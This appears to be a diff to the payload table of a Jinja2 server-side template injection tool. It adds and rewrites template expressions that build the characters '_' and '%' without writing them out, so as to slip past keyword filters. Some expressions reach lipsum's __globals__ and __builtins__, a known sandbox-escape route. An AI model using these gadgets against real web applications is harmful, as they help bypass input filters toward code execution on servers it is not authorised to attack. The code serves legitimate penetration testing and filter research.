@@ -46,9 +46,10 @@ context_payloads_all: ContextPayloads = {
     "{%set b={}|escape|urlencode|count%}": {"b": 6},
     "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
     "{%set l={}|escape|first|count%}": {"l": 1},
-    "{%set un=((({}|select()|trim|list)[24]))%}": {"un": "_"},
-    "{%set unn=(lipsum|escape|batch(22)|list|first|last)%}": {"unn": "_"},
-    "{%set perc=(lipsum()|urlencode|first)%}": {"perc": "%"},
+    "{%set un=({}|select()|trim|list)[24]%}": {"un": "_"},
+    "{%set urn={}|select()|trim|list|batch(25)|first|last%}": {"urn": "_"},
+    "{%set unn=lipsum|escape|batch(22)|list|first|last%}": {"unn": "_"},
+    "{%set perc=lipsum()|urlencode|first%}": {"perc": "%"},
     "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
     + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
     + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
@@ -57,10 +58,9 @@ context_payloads_all: ContextPayloads = {
     + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))%}": {
         "perccc": "%"
     },
-    "{%set prrc=((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join"
-    + ",(dict(c=x)|join),dict()|trim|last)|join).format(((9,9,9,1,9)|sum))%}": {
-        "prrc": "%"
-    },
+    "{%set prrc=((dict(dict(dict(a=1)|tojson|batch(2),)|batch(2),)|join,"
+    + "dict(c=x)|join,dict()|trim|last)|join).format((9,9,9,1,9)|sum)%}": {"prrc": "%"},
+    "{%set prrrc=1.__mod__.__doc__.__getitem__(11)%}": {"prrrc": "%"},
 }
 
 
